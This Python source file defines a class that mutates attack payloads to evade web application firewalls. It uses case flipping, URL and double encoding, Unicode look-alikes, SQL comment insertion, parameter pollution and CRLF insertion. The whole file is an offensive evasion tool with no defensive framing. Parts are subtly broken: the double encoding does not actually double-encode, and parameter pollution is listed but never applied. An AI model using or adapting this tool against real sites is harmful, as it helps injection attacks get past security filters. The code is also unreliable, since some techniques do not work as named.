import random
import string
import urllib.parse

class WAFBypass:
    def __init__(self):
        self.techniques = [
            "case_variation",
            "encoding",
            "double_encoding", 
            "unicode_normalization",
            "comment_injection",
            "parameter_pollution",
            "line_break_injection"
        ]
    
    def case_variation(self, payload):
        result = []
        for char in payload:
            if random.random() > 0.5:
                result.append(char.upper() if char.islower() else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def url_encode(self, payload):
        encoded = ""
        for char in payload:
            if char in '<>"\'=()&; ':
                encoded += f"%{ord(char):02x}"
            else:
                encoded += char
        return encoded
    
    def double_url_encode(self, payload):
        return self.url_encode(self.url_encode(payload))
    
    def unicode_normalization(self, payload):
        unicode_replacements = {
            '<': ['\uFF1C', '\u02C2', '\u1438'],
            '>': ['\uFF1E', '\u02C3', '\u1433'],
            "'": ['\u02B9', '\u02BC', '\u02C8'],
            '"': ['\u02BA', '\uFF02'],
            '=': ['\uFF1D', '\u2E40'],
            '(': ['\uFF08', '\u2E28'],
            ')': ['\uFF09', '\u2E29'],
            ';': ['\uFF1B', '\u037E'],
            '&': ['\uFF06', '\uFE60']
        }
        
        result = payload
        for original, replacements in unicode_replacements.items():
            if original in result and random.random() > 0.7:
                result = result.replace(original, random.choice(replacements), 1)
        return result
    
    def comment_injection(self, payload):
        comment_techniques = [
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('=', '/*!*/='),
            lambda p: p.replace("'", "/*!*/'"),
            lambda p: '/*!' + p + '*/',
            lambda p: '/*!00000' + p + '*/'
        ]
        
        technique = random.choice(comment_techniques)
        return technique(payload)
    
    def parameter_pollution(self, payload, param_name="field"):
        techniques = [
            f"{param_name}={payload}&{param_name}=legit",
            f"{param_name}=legit&{param_name}={payload}",
            f"{param_name}[]=legit&{param_name}[]={payload}",
            f"{param_name}=legit&{param_name}={payload}&{param_name}=legit"
        ]
        return random.choice(techniques)
    
    def line_break_injection(self, payload):
        break_chars = ['%0a', '%0d', '%0a%0d', '%0d%0a']
        result = payload
        
        if len(payload) > 10:
            positions = random.sample(range(1, len(payload)-1), min(3, len(payload)//4))
            for pos in sorted(positions, reverse=True):
                result = result[:pos] + random.choice(break_chars) + result[pos:]
        
        return result
    
    def generate_bypassed_payloads(self, original_payload, count=10):
        bypassed = set()
        
        while len(bypassed) < count:
            # Apply random combination of techniques
            current = original_payload
            
            # Apply 1-3 random techniques
            num_techniques = random.randint(1, 3)
            selected_techniques = random.sample(self.techniques, num_techniques)
            
            for technique in selected_techniques:
                if technique == "case_variation":
                    current = self.case_variation(current)
                elif technique == "encoding":
                    current = self.url_encode(current)
                elif technique == "double_encoding":
                    current = self.double_url_encode(current)
                elif technique == "unicode_normalization":
                    current = self.unicode_normalization(current)
                elif technique == "comment_injection":
                    current = self.comment_injection(current)
                elif technique == "line_break_injection":
                    current = self.line_break_injection(current)
            
            bypassed.add(current)
        
        return list(bypassed)[:count]

waf_bypass = WAFBypass()
